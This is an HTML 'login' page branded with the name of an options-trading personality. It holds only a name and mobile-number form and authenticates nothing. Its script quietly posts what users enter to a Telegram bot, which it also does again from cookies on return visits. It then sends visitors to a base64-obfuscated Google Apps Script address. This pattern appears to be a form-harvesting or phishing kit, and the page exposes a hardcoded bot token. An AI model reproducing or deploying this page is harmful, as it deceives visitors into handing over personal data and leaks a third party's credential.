<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vibhor Gupta - Vega Option Geek</title>
    <style>
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #000;
            flex-direction: column;
            color: white;
            font-family: Arial, sans-serif;
            animation: fadeIn 2s ease-in;
        }
        img {
            max-width: 90%;
            height: auto;
            margin-bottom: 20px;
            animation: zoomIn 1.5s ease-in;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            width: 90%;
            max-width: 400px;
            animation: slideUp 2s ease-in-out;
        }
        input, button {
            padding: 12px;
            font-size: 16px;
            border-radius: 8px;
            border: none;
            outline: none;
            transition: all 0.3s ease;
        }
        input:focus {
            box-shadow: 0 0 10px #00f;
        }
        button {
            background-color: #00f;
            color: #fff;
            cursor: pointer;
        }
        button:hover {
            background-color: #0055ff;
        }
    </style>
</head>
<body>
    <img src="IMG.jpg" alt="Vibhor Gupta - Vega Option Geek">
    <form id="loginForm">
        <input type="text" id="name" placeholder="Enter your name" required>
        <input type="tel" id="mobile" placeholder="Enter your mobile number" required>
        <button type="submit">Login</button>
    </form>

    <script>
        function sendTelegramMessage(name, mobile) {
            const telegramApiUrl = "https://api.telegram.org/bot5511964084:AAHV7mNKO35XLcNcEpnt4Pm_bfWF7yNag4k/sendMessage";
            const chatId = "-4612832676";
            const message = `User logged in: Name - ${name}, Mobile - ${mobile}`;
            fetch(telegramApiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            }).catch(error => console.error('Error sending Telegram message:', error));
        }

        function redirectToGoogleScript() {
            const redirectUrl = atob("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvc... (base64-encoded URL)");
            window.location.href = redirectUrl;
        }

        window.onload = function() {
            const cookies = document.cookie.split(';').map(c => c.trim());
            const cookieObj = {};
            cookies.forEach(c => {
                const [key, value] = c.split('=');
                cookieObj[key] = value;
            });
            if (cookieObj.name && cookieObj.mobile) {
                sendTelegramMessage(cookieObj.name, cookieObj.mobile);
                redirectToGoogleScript();
            }
        };

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const name = document.getElementById('name').value;
            const mobile = document.getElementById('mobile').value;
            const expires = new Date();
            expires.setTime(expires.getTime() + 24*60*60*1000); 
            document.cookie = `name=${name}; path=/; expires=${expires.toUTCString()}`;
            document.cookie = `mobile=${mobile}; path=/; expires=${expires.toUTCString()}`;
            sendTelegramMessage(name, mobile);
            redirectToGoogleScript();
        });
    </script>
</body>
</html>
